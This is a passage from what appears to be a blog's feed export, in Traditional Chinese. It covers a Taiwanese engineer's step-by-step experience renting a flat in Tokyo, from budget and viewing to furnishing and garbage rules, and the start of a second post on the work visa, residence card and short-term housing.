是用餐的地方 dining</li></ol><p>總之呢，像我跟我太太兩個人來說，通常至少需要 1LDK，預算更多的可以考慮 2LDK。</p><p>然後日本的房屋大小是用平方米來算，把它乘以 0.3（更精確是 0.3025）就是坪了。之前聽朋友說過，1LDK 的話如果是 40 平方米以上會比較舒適，也就是 12 坪。另外，這邊的坪數都是實坪，不用考慮公設跟公設比的問題。</p><p>之前有朋友去日本工作的時候有介紹自己的 1LDK 租屋，有興趣的可以看一下：<a href="https://www.youtube.com/watch?v=Oy-JuucBXmI&ab_channel=SimonLin">1LDK 新家開箱 | 東京月租16萬日幣的房子長什麼樣子？日本租屋流程、房間規劃分享、Room Tour</a></p><p>至於方位的話，坐北朝南是最好的。</p><p>房屋構造的話也分成很多種，像是：</p><ol><li>木造</li><li>SC 或 S 鋼構 （鉄骨）</li><li>RC 鋼筋混凝土（鉄筋コンクリート）</li><li>SRC 鋼骨鋼筋混凝土（鉄骨鉄筋コンクリート）</li></ol><p>想要隔音好的話，挑後兩種就對了，SRC 隔音是最好的，當初我在租房時只考慮 RC 跟 SRC。更多差異可以參考：<a href="https://suumo.jp/article/oyakudachi/oyaku/chintai/fr_room/fr_roomkouzou/">RC造とは？SRC造、S造、木造とはどんな建物構造？住み心地は違うの？</a>。</p><p>至於建築年份，除了房屋新舊以外，更在意的其實跟台灣一樣，是耐震程度。像是 921 以後台灣的房屋耐震標準有改過一版，所以才會有「要買房請挑 921 之後蓋的」的說法，而日本也是類似，最近一次改版是 2000 年，因此屋齡在 20 年以內算是最適合的。</p><h3 id="其他建築設備"><a href="#其他建築設備" class="headerlink" title="其他建築設備"></a>其他建築設備</h3><p>非常推薦這篇裡面講到的各種細節以及設備：<a href="https://medium.com/engineercurry/%E5%A4%96%E5%9C%8B%E4%BA%BA%E5%9C%A8%E6%97%A5%E6%9C%AC%E6%9D%B1%E4%BA%AC%E7%A7%9F%E6%88%BF-%E6%88%91%E6%98%AF%E6%80%8E%E9%BA%BC%E4%BD%BF%E7%94%A8-suumo-%E6%89%BE%E6%88%BF%E7%9A%84-a284205a69d1">外國人在日本東京租房 — 我是怎麼使用 SUUMO 找房的</a>，底下我簡單講幾個比較重要的。</p><p>首先，日本這邊不像台灣很多社區大樓都有 24 小時的警衛可以代收包裹，因此喜歡網購的朋友們會覺得很不方便。這時候，你就需要有「宅配箱（宅配ボックス）」的房子了！</p><p>宅配箱說穿了就是很多個有密碼鎖的櫃子，快遞會將物品放到宅配箱，然後配一組密碼，接著把密碼放到你的信箱或是寄電子郵件給你，你下班的時候再去宅配箱拿。</p><p><img src="/img/japan-tokyo-rental/p4.jpg" alt="宅配箱"></p><p>雖然聽起來很方便，但有兩點需要注意：</p><ol><li>宅配箱大小要注意，太小的放不下什麼東西，要注意網購寄來基本上都是用紙箱裝，體積會比買的物品還大</li><li>需要本人簽收的信件還是只能本人簽收</li></ol><p>針對第二點，在找地點的時候如果附近有假日會開的郵局的話，我覺得是個非常加分的選項，就可以假日去拿一定要本人簽收的信件。</p><p>接著第二個很重要的地方是敷地内ゴミ置場，也就是垃圾場。在日本倒垃圾是很麻煩的一件事情，都需要看好禮拜幾要丟什麼垃圾，例如說資源回收可能就是每週一次而已，錯過要再等一週。</p><p>因此如果有個垃圾場可以隨時倒垃圾，會是很方便的一件事情。</p><p>大概就這兩點是我覺得最重要的，其他可以看開頭貼的那篇文章，裡面有講到更多資訊。之前還看到有文章寫說有些比較貴的新房子會內建地暖，有些還會在廚房水槽內建廚餘處理機，但我自己找的房子沒看過這些就是了。</p><h2 id="第二關：定義預算"><a href="#第二關：定義預算" class="headerlink" title="第二關：定義預算"></a>第二關：定義預算</h2><p>大概知道有哪些找房條件以後，就可以根據預算來調整了。這兩樣我覺得先後順序不重要，反正一定會一直互相影響。例如說我原本預算抓 15 萬好了，結果發現這個預算底下既沒有宅配箱又沒有垃圾場，假如我很在意這兩個，就只好提高預算。</p><p>或也還有一種方式，那就是先去租房網站根據自己最想要的條件搜尋，看一下價位大概都是多少，接著才來思考預算問題。總之呢，每個人的預算都不同啦，總是會有個可以調整的空間跟上限。</p><p>再推薦一次上面那篇：<a href="https://medium.com/engineercurry/%E5%A4%96%E5%9C%8B%E4%BA%BA%E5%9C%A8%E6%97%A5%E6%9C%AC%E6%9D%B1%E4%BA%AC%E7%A7%9F%E6%88%BF-%E6%88%91%E6%98%AF%E6%80%8E%E9%BA%BC%E4%BD%BF%E7%94%A8-suumo-%E6%89%BE%E6%88%BF%E7%9A%84-a284205a69d1">外國人在日本東京租房 — 我是怎麼使用 SUUMO 找房的</a>，有教你用日本找房網站 SUUMO 來篩選，可以先用這個網站看看價位大概都是多少，再根據價位來調整預算以及想要的設備。</p><h3 id="其他需注意的細節"><a href="#其他需注意的細節" class="headerlink" title="其他需注意的細節"></a>其他需注意的細節</h3><p>日本租房基本上都會透過管理公司，所以你不會直接接觸到房東。</p><p>有些房東不想租給外國人，或是不想租給沒有保證人的人。在 SUUMO 上搜尋時記得勾選「不用保證人」之類的選項。</p><p>另外，所謂的「初期費用」就是租房以後剛開始要付的那一大筆錢，包括：</p><ol><li>第一個月的租金</li><li>押金（通常是一至兩個月）</li><li>禮金（通常是一個月，付錢給房東感謝他租你房子）</li><li>保證費用（付給保證公司）</li><li>住宅火險</li><li>仲介費（通常是一個月）</li><li>換鎖費用（這個是房客出）</li></ol><p>還不含買家具跟搬家費用什麼的，光是簽約之後要付的這一大筆，大概就要抓個「4~6 個月的房租」。</p><p>有些房子可能沒有禮金，但通常會轉嫁到租金上面，會貴一點點，不過可以省掉一些初期費用，可以自己做個取捨。</p><p>然後日本的租房合約基本上一簽就是兩年，提前解約的話要付違約金，細節的話就看合約怎麼規定。例如說我的租房合約就寫說一年後解約不用違約金，一年內的話要付一個月。</p><h2 id="第三關：整理好租房條件"><a href="#第三關：整理好租房條件" class="headerlink" title="第三關：整理好租房條件"></a>第三關：整理好租房條件</h2><p>我自己整理好的租房條件長這樣：</p><h3 id="租屋地點"><a href="#租屋地點" class="headerlink" title="租屋地點"></a>租屋地點</h3><ol><li>離六本木通勤時間 30 分鐘以內</li><li>最好是能夠不用換車直達</li></ol><h3 id="房型"><a href="#房型" class="headerlink" title="房型"></a>房型</h3><p>1LDK，40 平方米以上<br>方位：朝南為佳<br>構造：鋼筋</p><h3 id="預算"><a href="#預算" class="headerlink" title="預算"></a>預算</h3><p>基本上是希望月租 20 萬日幣以內，但如果條件不錯而且超過一點也可以接受，最高可以到 25 萬日幣。</p><h3 id="其他條件"><a href="#其他條件" class="headerlink" title="其他條件"></a>其他條件</h3><p>一定要有的：</p><ol><li>電梯</li><li>宅配箱，可以收網購的那種</li><li>敷地内ゴミ置場 (垃圾置放處)，可以隨時倒垃圾</li><li>三樓（含）以上</li><li>不要瓦斯桶</li><li>屋齡不要超過 20 年</li></ol><p>有的話很好：</p><ol><li>一樓有門禁，有安全鎖的那種</li><li>駐輪場あり (腳踏車停車場) </li><li>從家裡看出去有景觀</li><li>隔音比較好</li><li>屋齡 10 年以內</li></ol><h3 id="範例（都從-suumo-上找的）"><a href="#範例（都從-suumo-上找的）" class="headerlink" title="範例（都從 suumo 上找的）"></a>範例（都從 suumo 上找的）</h3><ol><li><a href="https://suumo.jp/chintai/bc_100341467784/">セントラルクリブ六本木I</a></li><li><a href="https://suumo.jp/chintai/bc_100341395526/">ウェリス六本木</a></li><li><a href="https://suumo.jp/chintai/bc_100335660253/">https://suumo.jp/chintai/bc_100335660253/</a></li><li><a href="https://suumo.jp/chintai/bc_100337794975/">麻布台TSタワ</a></li><li><a href="https://suumo.jp/chintai/bc_100333930776/">レジディア麻布台</a></li></ol><h2 id="第四關：找房屋仲介"><a href="#第四關：找房屋仲介" class="headerlink" title="第四關：找房屋仲介"></a>第四關：找房屋仲介</h2><p>在日本租房基本上都透過仲介居多，如果會講日文的話直接去想租的那區的仲介公司應該是最快的。像我這種不會講日文的，找個會說中文的仲介是最省事的。</p><p>在臉書上有各種台灣人在日本的社團，裡面都會有很多房仲，據說去那邊發文說想租房的話就會收到一堆房仲的訊息（我是沒試過啦），也會有些房仲常常在那邊貼租屋訊息。</p><p>每個仲介能拿到的房源基本上都是一樣的，他們似乎有個共同的系統可以查看，而我的話是會先在 SUUMO 上面自己找好想看的，再貼給房仲幫忙聯絡。</p><p>重點來了，根據我自己的經驗，在 SUUMO 或其他網站上面看到的物件，可能只有一兩成是最後可以看的，其他都是：</p><ol><li>已經租出去了，但還沒拿掉</li><li>已經有其他人先申請了</li><li>日期搭不上（可能兩個月後才開始出租）</li><li>需要保證人</li><li>不租給外國人</li></ol><p>我可能貼了 20 間給房仲，房仲幫忙聯絡過後，發現只有 1 間是真的可以租的。</p><p>找房有時候真的就是運氣運氣的，想要找到真的很理想的房屋的話，建議短租先租個兩個月，時間拉長的話就會有更多的物件可以看。</p><p>租屋條件定好了、仲介也找了，接下來就是看房了。</p><h2 id="第五關：看房"><a href="#第五關：看房" class="headerlink" title="第五關：看房"></a>第五關：看房</h2><p>看房的時候可以留意幾點：</p><ol><li>從車站走到房子的距離，路途是否好走，是不是會有上下坡等等</li><li>附近的生活機能（當初找房時因為我找的區域都在比較市區，所以沒有特別考慮這點）</li><li>附近有沒有開到很晚、很熱門的餐廳（有的話怕晚上比較吵）</li><li>附近會不會有電車經過（會比較吵）</li><li>通風以及採光</li><li>實際格局，建議帶個捲尺去量，會比較知道哪邊可以放什麼家具</li><li>宅配箱大小以及數量</li><li>社區公佈欄上面有貼什麼訊息（例如說剛好設備要整修一段時間之類的）</li><li>垃圾場的大小以及可以丟的種類</li><li>電梯的數量以及大小</li></ol><p>其中最需要在意的應該就是房間格局跟大小了，格局不好的話空間會比較難利用，建議實際量一下。</p><p>想要有比較大的工作桌的話，大小一般是 120x60 左右，不需要這麼大的話可能 100x50 就夠用了。</p><p>床的話單人床約莫是 90x195 左右，要床架的話會再大一點。沙發的話兩人座 120 公分差不多，還有再小一點的。</p><p>最理想的其實是早上、中午、晚上都去看一次，畢竟有些點可能單一時間看不太出來，例如說早上很安靜，晚上其實一堆開到凌晨的居酒屋或是串烤店等等。</p><p>不過晚上的話倒是不一定要實際進屋，去那一帶繞繞也是一個方法。</p><p>當初我大概在租房網站上找了 40 個房源，最後只有大概 4 個是可以看的，其中 2 個在看房前一週內就有人先申請了，所以最後能看的只有 2 間。</p><p>最後是在兩間內挑一個比較滿意的，就直接送申請了，天下武功，唯快不破。</p><h2 id="第六關：申請以及審查"><a href="#第六關：申請以及審查" class="headerlink" title="第六關：申請以及審查"></a>第六關：申請以及審查</h2><p>並不是你想租房，房東跟管理公司就會租給你。</p><p>當你看好之後，你必須先提交申請，需要提供相關資料例如說入職證明以及預定年收等等，必須管理公司跟房東都同意了，才能真的開始進入簽約流程。</p><p>之前聽到的說法是房租在月薪的 1&#x2F;3 以內會比較保險，舉例來說，如果想租月租 10 萬的房屋的話，月薪必須在 30 萬以上，否則審查就有比較高的機率會不通過。</p><p>這個階段就是提供一些資料給房仲，房仲幫你送申請，接下來就是等審查結果，我自己的經驗是等了一週左右。</p><h2 id="第七關：簽約"><a href="#第七關：簽約" class="headerlink" title="第七關：簽約"></a>第七關：簽約</h2><p>通過了審查之後，終於可以簽約了！</p><p>簽約的過程大概要一個半小時到兩小時左右，為什麼這麼久呢？因為根據日本法律規定，房客有義務要聽完關於房子的各種重要事項，而需要考取國家資格（宅地建物取引士）才能向房客說明。</p><p>所以簽約過程中有一大段都是宅建士一字一字把重要事項唸給你聽，這個是跟台灣很不同的一點。</p><p>重要事項裡面包含的東西真的超級多，從基本的像是房屋地址、大小、屋況說明、設備等等，一直到房屋裡面哪些東西的損壞是房東負責，哪些是房客負責，再到淹水的時候要到那裡避難等等，是很詳盡的一份文件。</p><p><img src="/img/japan-tokyo-rental/p5.jpg" alt="租房合約"></p><p>因為宅建士是講日文，所以有房仲幫忙翻譯，不過因為合約書上面都是漢字居多，其實大概八九成也都看得懂在講什麼，完全不會日文也不用擔心。</p><p>一切確認沒問題之後，就可以簽約了，記得要帶個印章，是要簽名加蓋章，同時也需要把初期費用繳清。</p><p>都弄好之後，就會把合約拿去給管理公司簽，接下來就等著領鑰匙入住了。</p><h2 id="第八關：入住以及水電瓦斯及網路"><a href="#第八關：入住以及水電瓦斯及網路" class="headerlink" title="第八關：入住以及水電瓦斯及網路"></a>第八關：入住以及水電瓦斯及網路</h2><p>儘管找房時已經花費很多心力，但真正入住之後才是考驗的開始，如果會講日文或是找一個會講日文的朋友來幫忙，會順利很多。</p><p>日本的水電瓦斯是要主動去開通的，水電沒什麼問題，但瓦斯的話瓦斯公司會派人來家裡檢查設備，順便說明一些注意事項，跟瓦斯公司的溝通基本上都會是全日文。</p><p>我的話是請房仲協助預約，然後開通的時候是直接找一個會講日文的朋友幫忙，省了很多溝通的麻煩。</p><p>網路的話又是另外一個狀況了，有些房子很方便有內建網路，有另外一些已經把網路線牽好了，只要找網路公司簽約就可以用，最麻煩的是有些連線都沒牽的，就會需要施工，據說要等個一個多月才有網路可以用。</p><p>我住的地方是屬於線已經牽好了，然後管理公司有指定網路公司，所以一樣由房仲協助溝通，在網路開通前會先寄設備過來，網路線插上去以後需要登入進去設定，會需要設定 PPPoE 的帳號密碼，如果對網路一竅不通的話，大概會搞滿久的。</p><p>不過網路公司通常都會有紙本說明或是官方影片，照著做其實就可以了。</p><p>我最後用的網路是這一間：<a href="https://join.biglobe.ne.jp/ftth/hikari/lp/ls/lp02/?ls=1">BIGLOBE</a>，一個月大概是 1000 台幣左右，有附一台租來的路由器，我也不知道算貴還是便宜，沒有比較基準。</p><p>由於水電瓦斯跟網路都需要時間，不是今天申請明天就可以用，因此建議合約簽完之後就可以開始聯絡了，因為合約簽完也大概是等一週入住，剛好趁這時間把這些都搞定，入住之後就可以開始用了。</p><p>我的話因為入住時間跟短租有重疊到一週，所以沒有那麼急迫可以慢慢來，網路的話因為各種因素是入住一週後才有的，在這一週間就靠著手機熱點擔任救援投手。</p><h2 id="第九關：買家具"><a href="#第九關：買家具" class="headerlink" title="第九關：買家具"></a>第九關：買家具</h2><p>把生活基本需求搞定以後，就要來進家具囉！</p><p>問過身邊的幾個朋友，家具以及家電通常會由以下管道入手：</p><ol><li>宜得利</li><li>IKEA</li><li>Mercari &#x2F; 樂天市場買二手</li><li>家電以及家具組合包（關鍵字：家電セット）</li><li>透過台灣人社團購買</li></ol><p>在日本其實滿多二手家具的，價格通常都是五折起跳，有些使用的狀況也很不錯，因此是個 CP 值滿高的選項。像我的話就是在 <a href="https://jp.mercari.com/user/profile/966060067">Mercari</a> 上面買了二手的洗衣機加冰箱組合，只要 4 萬塊日幣而已，真的很超值：</p><p><img src="/img/japan-tokyo-rental/p6.jpg" alt="家電組合"></p><p>其他比較小的家電就透過 Amazon 買，購入的品項有：</p><ol><li><a href="https://www.amazon.co.jp/-/zh/gp/product/B0BQXCZX1D/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&th=1">日立 掃除機 かるパックスティック 紙パック式 スティッククリーナー PKV-BK3K V ライトラベンダー 日本製 強力パワー 軽量 自走式</a></li><li><a href="https://www.amazon.co.jp/-/zh/gp/product/B09LTYV6ZN/ref=ppx_yo_dt_b_asin_title_o00_s01?ie=UTF8&psc=1&language=ja_JP">象印 IH炊飯ジャー (5.5合炊き) 極め炊き ブラウン NW-VC10-TA</a></li><li><a href="https://www.amazon.co.jp/-/zh/gp/product/B08G89DTF7/ref=ppx_yo_dt_b_asin_title_o01_s00?ie=UTF8&th=1">パナソニック 生ゴミ処理機 家庭用 コンポスト 温風乾燥式 6L シルバー MS-N53XD-S</a></li><li><a href="https://www.amazon.co.jp/-/zh/gp/product/B0BXX4HY2T/ref=ppx_yo_dt_b_asin_title_o05_s00?ie=UTF8&th=1">XGIMI MoGo 2 投影機</a></li></ol><p>其中最貴的是廚餘處理機，要 18000 台幣左右，不過同個型號在台灣似乎要價快兩倍，這樣比下來其實還是滿超值的。</p><p>這也是人生中第一次購買廚餘機，原本在台灣的時候家裡是沒有的，但這邊倒垃圾比較麻煩規矩比較多，廚餘機似乎也比較普遍，就想說買一台試用看看。</p><p>在家電的部分，買了洗衣機、冰箱、投影機、吸塵器、電子鍋以及廚餘處理機，總花費大約是 22 萬日幣左右。</p><p>接著來講一下寢具好了，這次沒有買床，而是直接買床墊放地上，雖然說放地上如果潮濕的話似乎容易發霉，但日本的氣候比較乾燥，應該是不至於。到時候如果真的太潮濕，也可以補買一個床架。</p><p><img src="/img/japan-tokyo-rental/p7.jpg" alt="床"></p><ul><li>床是宜得利買的：<a href="https://www.nitori-net.jp/ec/product/5651913s/">3つ折り高反発マットレス 厚さ10cm(日本製）シングル</a></li><li>鋪墊也是宜得利：<a href="https://www.nitori-net.jp/ec/product/7566631s/">置くだけ簡単　敷きパッド　シングル(NウォームSP BR SA2311)</a></li><li>被子也是：<a href="https://www.nitori-net.jp/ec/product/7544531s/">温度調整 掛け布団　シングル(CELL 2 S)</a></li><li>枕頭當然也是：<a href="https://www.nitori-net.jp/ec/product/7550565s/">硬くなりにくい低反発まくら(Mモレーザ)</a></li></ul><p>這樣一組加起來約 23500 日幣。</p><p>最後是桌椅的部分，桌椅我隨意上網搜尋，找到了這個網站：<a href="https://www.flexispot.jp/">https://www.flexispot.jp/</a></p><p>由於桌椅都有賣，而且如果選組裝服務的話可以兩個一起組，我就買這個了。是一個電動升降桌以及椅子，加上運送以及組裝，總價是 55000 日幣。</p><p><img src="/img/japan-tokyo-rental/p8.jpg" alt="桌椅"></p><p>家電 22 萬，寢具抓個 5 萬，桌椅抓個 10 萬，加一加大概 40 萬日幣可以搞定兩個人的家具以及家電。對了，Amazon 線上刷卡可以刷台灣的卡，所以不用擔心日幣帶不夠的問題。</p><p>而宜得利的話我線上刷卡刷不過，就連 JCB 也刷不過，所以只好請我太太去現場購買再送到家裡，現場買的話就可以刷台灣的卡了，只是不能網購還是不太方便。</p><h2 id="第十關：倒垃圾"><a href="#第十關：倒垃圾" class="headerlink" title="第十關：倒垃圾"></a>第十關：倒垃圾</h2><p>家電跟家具買完以後，終於是能夠順利生活、睡覺以及用電腦了，但還有最後一個問題需要處理：垃圾。</p><p>每買一次 Amazon 就多一個紙箱，然後桌椅那些更是一堆紙箱以及保麗龍，這些都需要丟回收。</p><p>紙箱的話就記得壓扁，要做到更好的話就是紙箱上面黏的紙跟膠帶都要撕掉，就可以拿去丟了，記得要先看好回收的日期，大約都是每週一次，有些地方還會要求要捆起來。</p><p>目黑區的資源回收日期：</p><p><img src="/img/japan-tokyo-rental/p9.jpg" alt="回收日期"></p><p>除了紙箱以外，也會有一堆保麗龍。</p><p>保麗龍的話似乎在不同區會有不同分類，在我這邊是塑膠類，所以就準備一個透明袋子裝進去就好。</p><p>把垃圾全都丟掉以後，終於有「完成了」的感覺。</p><h2 id="第十一關：更換住址"><a href="#第十一關：更換住址" class="headerlink" title="第十一關：更換住址"></a>第十一關：更換住址</h2><p>如果之前有把住址登記在其他地方，記得要去區役所更換地址。如果新家跟舊家不同區，那就要跑兩趟。</p><p>第一趟先去舊家的區役所辦理轉出，因為轉出不需要改在留卡，所以流程會比登記住址還要快，大概 15 分鐘就結束了，會拿到一個轉出單。辦理轉出之後，其實不一定要同一天去辦，14 天以內其實都可以辦理。</p><p>轉入的話就是去新住址的區役所，帶著那張轉出單然後再填寫一些資料，就可以辦理轉入了，整體流程跟之前第一次登記住址的時候差不多，在留卡上面也會寫下新的住址，到此為止就把所有搬家流程全都跑完了。</p><p>當初遷入台東區的時候什麼都沒有，沒想到目黑區有這麼一本厚厚的生活指南，裡面有中日英韓四種語言，很適合拿來學日文：</p><p><img src="/img/japan-tokyo-rental/p10.jpg" alt="生活指南"></p><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>簡單分享一下我目前住的地方，地點是中目黑，離車站走路約 10 分鐘，1LDK，大約 12 坪左右：</p><p><img src="/img/japan-tokyo-rental/p11.jpg" alt="住處"></p><p>這張是從陽台往內拍的，廣角鏡頭所以左右兩邊其實都還有一些空間，左下角沒拍到的地方還有放一張桌子跟椅子，右下角之後會放沙發跟小桌子，走到底左轉是廁所跟衛浴，兩個是分開的。</p><p>整棟大樓大約 30 戶左右，有宅配箱但是沒有我一開始想要的隨時都可以倒資源回收的垃圾場，屋齡是 20 年以內，但是一兩個月前有整修過所以看起來很新。</p><p>租金加管理費一個月大約為 21 萬（但是不需要禮金），稍微有點爆預算，但就如同上面寫的，當時的選擇並不多，雖然說這間沒有到非常滿意，但也算不錯了。</p><p>話說日本的租房雖然普遍比台灣貴，但是貴多少就要看每個人的選擇了，以兩個人 1LDK 的房子來說，20 萬已經算是高的了，主要是我租房的地點目黑區滿貴的，之前有朋友說覺得這一區有點像是天母的感覺。</p><p>同樣的房屋條件，只有地點變更的話，再遠個 10~15 分鐘應該可以降到 15 萬左右，再往遠處找就越遠越低，但我也不確定會到多少，有興趣的可以自己去 SUUMO 找找看。</p><p>以上就是這次租屋的心得分享，在這次租房過程中感受到了如果能懂一點日文，新手任務應該會順暢滿多的。像是有些送家具的可能會打電話跟你溝通，開通瓦斯的時候如果有些不對勁的地方也是會用日文跟你講，不會日文的話還是有點阻礙。</p><p>因此，朋友是很重要的，像我就是把水電瓦斯開通跟送家具都安排在同一天，當天直接請一個會講日文的朋友來坐鎮，解決各種溝通疑難雜症大小事。感覺每個來日本跑新手任務又不會日文的工程師說不定都碰過類似問題，如果有人出一個「新手任務大禮包」，提供中日翻譯服務，能夠幫我溝通各種業者並且在進家具的時候坐鎮家中，那我會購買的意願還是滿高的。</p>]]></content>
      
      
      <categories>
          
          <category> 日本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 日本工作新手任務破關心得：簽證、住址、門號與銀行</title>
      <link href="/2023/10/29/japan-newbie-visa-address-phone-and-bank/"/>
      <url>/2023/10/29/japan-newbie-visa-address-phone-and-bank/</url>
      
        <content type="html"><![CDATA[<p>最近終於把來日本的新手任務跑得差不多了，在解任務之前參考了許多網路上的資料，可以說是獲益良多，我覺得這些新手任務真的超級需要攻略，真的很有幫助，我會在文末附上當初有參考到的資料。</p><p>底下就按照當初解任務的時間序來撰寫，基本上會包含所有來日本工作的必備流程。這篇只會講到「找到工作以後會跑的流程」，不包含如何找工作本身。</p><p>對了，我本身日文程度是看得懂五十音，沒了。所以這篇也很適合跟我一樣基本上不會日文的人參考。最近寫心得文喜歡順便附上時間，也會順便附上有紀錄的時間軸供大家參考。</p><h2 id="第一關：在留資格認定證明書"><a href="#第一關：在留資格認定證明書" class="headerlink" title="第一關：在留資格認定證明書"></a>第一關：在留資格認定證明書</h2><p>要來日本工作的流程是這樣的，首先在日本的公司必須幫你去入管局申請在留資格，在留資格通過之後，你就會拿到一個「在留資格認定證明書」，有了這個才能在台灣申請簽證。</p><p>以前在網路上看到的心得都是收到紙本的在留資格認定證明書，日本公司那邊收到以後會寄過來台灣。</p><p>不過從 2023 年 3 月開始，也可以申請電子版的在留資格認定證明書，就是一個看起來不太有效力的 email，上面有你的通知書編號什麼的，我就是拿電子版的。</p><p>日本官方公告可以參考：<a href="https://www.moj.go.jp/isa/applications/procedures/10_00136.html">在留資格認定証明書の電子化について</a></p><p>先附一下時間線，我是 2023&#x2F;06&#x2F;20 辦理簽證，2023&#x2F;09&#x2F;10 拿到在留資格認定證明書，辦理的是俗稱的技人國簽證，等待時間約為兩個半月。</p><p>無論是拿紙本的還是電子的，拿到在留資格認定證明書以後，就可以去日本台灣交流協會辦理工作簽證了。</p><p>這關沒什麼，就是一直等等等而已，話說疫情時期的心得文會告訴你需要另一個叫做「受付濟證」的東西，這個現在沒了。</p><h2 id="第二關：去日本台灣交流協會辦理簽證"><a href="#第二關：去日本台灣交流協會辦理簽證" class="headerlink" title="第二關：去日本台灣交流協會辦理簽證"></a>第二關：去日本台灣交流協會辦理簽證</h2><p>官網可以載得到申請書：<a href="https://www.koryu.or.jp/tw/visa/taipei/application/">https://www.koryu.or.jp/tw/visa/taipei/application/</a></p><p>請先在網路上填好並且印出來，需要帶的資料這邊也都有寫了：<a href="https://www.koryu.or.jp/tw/visa/taipei/general/detail1/">https://www.koryu.or.jp/tw/visa/taipei/general/detail1/</a></p><p>申請書的話根據我當時的經驗，有幾點要注意：</p><ol><li>如果還沒買機票，航空公司跟機場一樣要填，填預計的就好，不能寫未定</li><li>推薦人寫同上即可</li><li>「與申請人的關係」填入「就職公司」</li><li>辦理簽證時會再確認一遍大頭照是不是六個月之內拍的</li></ol><p>然後記得要帶第一關拿到的在留資格認定證明書。</p><p>如果你是拿電子版的，記得要把它印出來。而且收到的時候會有日文版跟英文版的，請把整封信全部印出來，當作一個完整的文件來看待。不要像我一樣自作聰明只印日文的，就會需要重新再去印一次。</p><p>日本台灣交流協會在台北跟高雄各有一個，我是去台北的。</p><p>最佳抵達時間是開館前十分鐘，大約排五分鐘就可以進去領號碼牌了，基本上都是排在第一個。辦理簽證的流程滿快的，整個流程大約十幾分鐘就結束了，辦完之後會給你一個證明，上面有寫什麼時候取件，要注意雖然營業時間到五點，取證只到四點。</p><p>要注意的是辦理簽證的時候護照會被收走，所以記得這段期間不要安排出國的行程。</p><p>取證時間大概會是一個禮拜後，就可以來拿護照，拿的時候就可以看到上面有日本的工作簽證了。</p><p>時間軸：</p><ul><li><code>2023/09/12（二）</code> 去台日交流協會辦簽證</li><li><code>2023/09/19（二）</code> 取證</li></ul><h2 id="第三關：機場辦在留卡"><a href="#第三關：機場辦在留卡" class="headerlink" title="第三關：機場辦在留卡"></a>第三關：機場辦在留卡</h2><p>拿到工作簽證以後，就可以飛去日本啦！</p><p>這一段反倒比較少人寫心得，一些細節我沒查到有什麼人講，那我來寫一下好了。</p><p>首先，VJW 一樣要填，因為到時候入境也還是要過行李跟刷 QRCode 什麼的，所以記得要填。</p><p>再來是入境時會走「觀光通道」，就跟你一般觀光時一樣，不會特別分開。排到你的時候就出示一下護照的工作簽證那一頁，入國審查官就會知道了。</p><p>話說如果在留許可是拿電子檔的話，建議印出來一份。因為當時他有問我，我就拿出手機，他問我說：「online？」，我說對，他就揮揮手說那不用了。我原本以為有了簽證就不需要了，但印出來還是比較保險一點。</p><p>接著就一樣按指紋拍照什麼的，就會拿到所謂的「在留卡」，之後要在日本驗證身份都要靠這個。</p><p>除此之外我有拿到一個小紙條，上面寫說記得登記住址：</p><p><img src="/img/japan-newbie-visa-address-phone-and-bank/p1.jpg" alt="小紙條"></p><h2 id="赴日的三角難題"><a href="#赴日的三角難題" class="headerlink" title="赴日的三角難題"></a>赴日的三角難題</h2><p>網路上流傳著一個「死亡三角」的說法，這三個角分別是手機門號、租房以及銀行帳號。</p><p>要怎麼辦手機門號？要先有「有效力」的在留卡，有效力指的是「有登記住址」。那要怎麼租房？要有手機跟銀行帳號才能租房。那要怎麽辦銀行帳號？要有有效力的在留卡以及手機門號才能辦銀行。</p><p>於是你會發現，這三個東西環環相扣，乍看之下似乎什麼都辦不了，但換個角度來看，也代表你解決了一個，另外兩個通常也迎刃而解。</p><p>我自己的順序是：在台灣先尋找短租 &#x3D;&gt; 登記住址 &#x3D;&gt; 辦手機門號 &#x3D;&gt; 辦銀行帳號 &#x3D;&gt; 找長期租房。</p><h2 id="第四關：尋找短租"><a href="#第四關：尋找短租" class="headerlink" title="第四關：尋找短租"></a>第四關：尋找短租</h2><p>先聲明一下，短租並非必備。短租的最大用處是可以登記住址，登記完以後你的在留卡就是完全體了，就可以拿去辦手機，辦完手機去開戶，接著開始找長期的住宿。</p><p>但除了短租之外，也有幾種選擇，例如說：</p><ol><li>先把地址登記在認識的朋友家</li><li>在台灣就先找好長期住宿</li></ol><p>第一種選項還是需要解決住宿的問題，但住飯店也可以。之所以會找短租，是因為據說飯店通常不能登記地址，因此如果已經登記了住址，住飯店確實比較方便，不過價錢通常也比較高。</p><p>第二種選項是在台灣就先找日本的長期租房，也就是俗稱的海外審查，能租的物件會比較少一點，而且不能實際看房，但好處就是一來日本就即刻入住，也是滿方便的。</p><p>像我選擇短租的話，就是先在其他地方住一個月，在此期間開始找房，找到以後再搬過去。話說日本如果要換地址的話，跨區會比較麻煩一點，例如說我從台東區搬到目黑區，就要先去台東區役所辦理遷出，再去目黑區役所辦理遷入，要跑兩個地方。</p><p>因此，如果你已經大概知道之後長期租房要住哪，建議短租也找同一區，換地址會方便很多。</p><p>而短租也有幾種不同類型，最便宜的有那種超小間的 share house，衛浴共用但有私人小空間，當然也有那種跟別人同住的。</p><p>我住的是另外一種，可以用關鍵字「マンスリー」找到的月租公寓，雖然價格會貴一點，但是空間也比較大，都是套房居多。</p><p>我用的網站是這個：<a href="https://www.unionmonthly.jp/">https://www.unionmonthly.jp/</a></p><p>價格寫得很清楚，網站上的搜尋也很方便，條件也都寫在上面。費用就是月租加上管理費（共益費）再加上一次性的清掃費。所有流程都可以在網路上面完成，可以登記住址，然後房租可以刷卡，滿方便的。</p><p><img src="/img/japan-newbie-visa-address-phone-and-bank/p2.png" alt="union monthly"></p><p>我自己用起來的體驗還不錯，房間住起來也沒什麼問題，但有幾點要提醒的。</p><p>首先，網路上申請完以後可能會收到通知，說申請人地址要在日本，然後緊急聯絡人要會講日文。我是回信跟他說我人不在日本，所以沒有日本地址，然後緊急聯絡人會講日文，接著就可以進到下一關。</p><p>下一關付款的時候他可能會跟你要銀行帳號，可以回信說你要信用卡付款，就會寄刷卡連結給你了。（寫信請用日文，請愛用 ChatGPT 